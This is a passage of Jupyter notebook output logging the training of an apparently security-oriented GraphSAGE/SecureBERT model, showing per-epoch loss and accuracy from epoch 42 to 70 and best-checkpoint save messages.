     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:51:27 | INFO | Validation Loss: 0.1940 | Validation Accuracy: 0.9535\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a87c825825bb456abd54aaf75c41c062",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:51:39 | INFO | Epoch 42 | Train Loss: 0.2284 | Train Accuracy: 0.9451\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "001845f96ab142918a1c23b0b257c0f6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:51:40 | INFO | Validation Loss: 0.2092 | Validation Accuracy: 0.9485\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "082a9b03054747dfb8f763ccde0381ca",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:51:52 | INFO | Epoch 43 | Train Loss: 0.2341 | Train Accuracy: 0.9430\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3896c42ad68f4862b6ad1119780030ae",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:51:54 | INFO | Validation Loss: 0.2170 | Validation Accuracy: 0.9447\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4226c4d27b4740c3a6daf189a97828c4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:52:06 | INFO | Epoch 44 | Train Loss: 0.2209 | Train Accuracy: 0.9464\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9a8e631219a4418c8e9ff8804a6a7bfa",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:52:08 | INFO | Validation Loss: 0.1904 | Validation Accuracy: 0.9532\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b042e2459b8143fa96290df8366da352",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:52:20 | INFO | Epoch 45 | Train Loss: 0.2215 | Train Accuracy: 0.9453\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cb0fbd752d644e9a9224e63537917c31",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:52:21 | INFO | Validation Loss: 0.1688 | Validation Accuracy: 0.9587\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "28fe0d2abdc44b9abb895d22f531af11",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:52:33 | INFO | Epoch 46 | Train Loss: 0.2186 | Train Accuracy: 0.9460\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "57c5c1b656f047e392bc319a7fa9b1d7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:52:34 | INFO | Validation Loss: 0.1581 | Validation Accuracy: 0.9629\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_46_loss_0.1581_acc_0.9629\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f43b10db095d41de974773f66ad8a3c2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:52:47 | INFO | Epoch 47 | Train Loss: 0.2138 | Train Accuracy: 0.9470\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b3e5e35d2e554ab1a55a20aa07c7b289",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:52:49 | INFO | Validation Loss: 0.1666 | Validation Accuracy: 0.9573\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7f28e13aecd945c4bc51aa7d7ebbdc39",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:53:01 | INFO | Epoch 48 | Train Loss: 0.2083 | Train Accuracy: 0.9481\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "40083b4015704f7e8cfc68e189462279",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:53:03 | INFO | Validation Loss: 0.1549 | Validation Accuracy: 0.9608\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_48_loss_0.1549_acc_0.9608\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "29c06293f5a846c9a7518e165a902449",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:53:14 | INFO | Epoch 49 | Train Loss: 0.2052 | Train Accuracy: 0.9486\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9de6315ae0164541ad3cd7d65d2477be",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:53:16 | INFO | Validation Loss: 0.1572 | Validation Accuracy: 0.9597\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ca03483957a043a4b0a5e575d9dab0ef",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:53:28 | INFO | Epoch 50 | Train Loss: 0.2071 | Train Accuracy: 0.9476\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "df0527fd97e14066afdf80368ede4b45",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:53:29 | INFO | Validation Loss: 0.1520 | Validation Accuracy: 0.9617\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_50_loss_0.1520_acc_0.9617\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ca54476ec0984cb8b9753c4e032c5b20",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:53:41 | INFO | Epoch 51 | Train Loss: 0.2018 | Train Accuracy: 0.9491\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7278d9d2777d4e2aa34effe4997ab6b3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:53:43 | INFO | Validation Loss: 0.1566 | Validation Accuracy: 0.9590\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ab5169e98f2c4bdf9ead28de8f3a1059",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:53:55 | INFO | Epoch 52 | Train Loss: 0.1983 | Train Accuracy: 0.9500\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8add6dda65ae44bbb5c68ca0284554f0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:53:56 | INFO | Validation Loss: 0.1531 | Validation Accuracy: 0.9614\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2e4da2f119be48e1bad0fb542064a9e3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:54:08 | INFO | Epoch 53 | Train Loss: 0.1953 | Train Accuracy: 0.9504\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2a5e91bbbdb046169c7a15f9e4dc8cea",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:54:10 | INFO | Validation Loss: 0.1524 | Validation Accuracy: 0.9604\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a872962ad7134633888aeef35c73334a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:54:21 | INFO | Epoch 54 | Train Loss: 0.1959 | Train Accuracy: 0.9505\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f6ce3e0934084c178b0d7939551b1020",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:54:23 | INFO | Validation Loss: 0.1877 | Validation Accuracy: 0.9505\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2cc6fc2f2a9f4269a3354c4f2b63b8ee",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:54:34 | INFO | Epoch 55 | Train Loss: 0.1878 | Train Accuracy: 0.9523\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a32ef703da89406db85220cb32323767",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:54:36 | INFO | Validation Loss: 0.1568 | Validation Accuracy: 0.9581\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "689464ccbb1640feae825eae4006e773",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:54:48 | INFO | Epoch 56 | Train Loss: 0.1983 | Train Accuracy: 0.9501\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5e9c6e2c8017478795b8d9907def5918",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:54:49 | INFO | Validation Loss: 0.1870 | Validation Accuracy: 0.9509\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6f15dd05fd1d47d3acab4681ea87ca32",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:55:02 | INFO | Epoch 57 | Train Loss: 0.1967 | Train Accuracy: 0.9499\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "af2b597b6da34831ac836e27603306d1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:55:03 | INFO | Validation Loss: 0.1457 | Validation Accuracy: 0.9627\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_57_loss_0.1457_acc_0.9627\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4f252977bd61440b9161aa6d0c74c50e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:55:15 | INFO | Epoch 58 | Train Loss: 0.1896 | Train Accuracy: 0.9521\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e573928483d64a4dbbe009160adfb92e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:55:17 | INFO | Validation Loss: 0.1786 | Validation Accuracy: 0.9535\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8f3adf02bc174294ab37d652e19bd392",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:55:29 | INFO | Epoch 59 | Train Loss: 0.1981 | Train Accuracy: 0.9498\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "26d804ba641e4dd7a9714dee37f349cc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:55:30 | INFO | Validation Loss: 0.1577 | Validation Accuracy: 0.9601\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "757cdc647cb344fbbf0e76440b8589c5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:55:42 | INFO | Epoch 60 | Train Loss: 0.1882 | Train Accuracy: 0.9523\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "72c814270b3c4062b5a2a1754898a488",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:55:44 | INFO | Validation Loss: 0.1653 | Validation Accuracy: 0.9572\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8e7437b063ab42aeb1fad6d085e4f883",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:55:56 | INFO | Epoch 61 | Train Loss: 0.1869 | Train Accuracy: 0.9528\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "73f7ac2005bd49f987116c48d3ce64ee",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:55:58 | INFO | Validation Loss: 0.1321 | Validation Accuracy: 0.9658\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_61_loss_0.1321_acc_0.9658\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c5355d5406a443cb8b5db5d0a9281cf3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:56:09 | INFO | Epoch 62 | Train Loss: 0.1916 | Train Accuracy: 0.9515\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "17bd5b3a2df34fe4945ea2a248343d7a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:56:11 | INFO | Validation Loss: 0.1685 | Validation Accuracy: 0.9565\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "aea03550154a4ac59f596f692a856708",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:56:23 | INFO | Epoch 63 | Train Loss: 0.1909 | Train Accuracy: 0.9517\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "abb291ba301647e4895e637ccf46b53b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:56:24 | INFO | Validation Loss: 0.1489 | Validation Accuracy: 0.9616\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9ad401c50e7e47b4a324d0f53abc15d8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:56:37 | INFO | Epoch 64 | Train Loss: 0.1879 | Train Accuracy: 0.9522\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "26e43ea9a31243399803002b520ef4e3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:56:39 | INFO | Validation Loss: 0.1466 | Validation Accuracy: 0.9628\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "20f0d16adb9940e9ab1f0d92771192d0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:56:51 | INFO | Epoch 65 | Train Loss: 0.1897 | Train Accuracy: 0.9517\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e650d7f2f83a4b6c9920697693a3119c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:56:53 | INFO | Validation Loss: 0.1499 | Validation Accuracy: 0.9615\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "761ae3304da34755a92921d48179d832",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:57:05 | INFO | Epoch 66 | Train Loss: 0.1947 | Train Accuracy: 0.9505\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "82e900f4ac784fbdae939145cdf396ec",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:57:07 | INFO | Validation Loss: 0.1428 | Validation Accuracy: 0.9635\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "15ee71236c574eb0929b25785ed221ab",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:57:19 | INFO | Epoch 67 | Train Loss: 0.1952 | Train Accuracy: 0.9506\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c1e5d3d60d784bc5b144984538f082d5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:57:20 | INFO | Validation Loss: 0.1501 | Validation Accuracy: 0.9605\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ba89ad671c0549b4961b385f4069821d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:57:33 | INFO | Epoch 68 | Train Loss: 0.1904 | Train Accuracy: 0.9514\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "771ab2e0779a4095b2632e1229d0eb81",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:57:34 | INFO | Validation Loss: 0.1577 | Validation Accuracy: 0.9598\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bc54d4694b464118b1ef1b11b5adc6e1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:57:46 | INFO | Epoch 69 | Train Loss: 0.2049 | Train Accuracy: 0.9471\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2296e00c3ae24c21a3cbef4903c53fda",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:57:48 | INFO | Validation Loss: 0.1444 | Validation Accuracy: 0.9629\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2c73dc18721c42d780ff22d681d5b268",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:58:00 | INFO | Epoch 70 | Train Loss: 0.1875 | Train Accuracy: 0.9521\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fd9baa3279034160b96d38f6cba8c425",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:58:01 | INFO | Validation Loss: 0.1371 | Validation Accuracy: 0.9664\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "74090bbe5de8470ea7f65db09364f42c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
